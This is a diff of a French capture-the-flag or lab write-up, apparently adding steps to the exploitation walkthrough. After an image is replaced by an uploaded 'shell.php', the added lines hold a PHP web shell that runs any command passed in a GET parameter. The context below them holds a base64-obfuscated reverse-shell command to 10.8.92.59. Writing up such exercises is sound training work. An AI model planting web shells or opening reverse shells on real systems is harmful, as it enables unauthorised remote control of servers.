@@ -32,6 +32,14 @@ On accède au dashboard administrateur.
 
 On remplace une image uploadée par un fichier `shell.php`. Celui-ci contient un payload codé en base64 :
 
+
+``` php
+<?php system($_GET['cmd']); ?>
+```
+
+On peut ensuite envoyer n'importe quel commande grace au `GET` donc on envoie un reverse shell :
+
+
 ```bash
 echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuOC45Mi41OS85MDAyIDA+JjE=" | base64 -d | bash
 ```
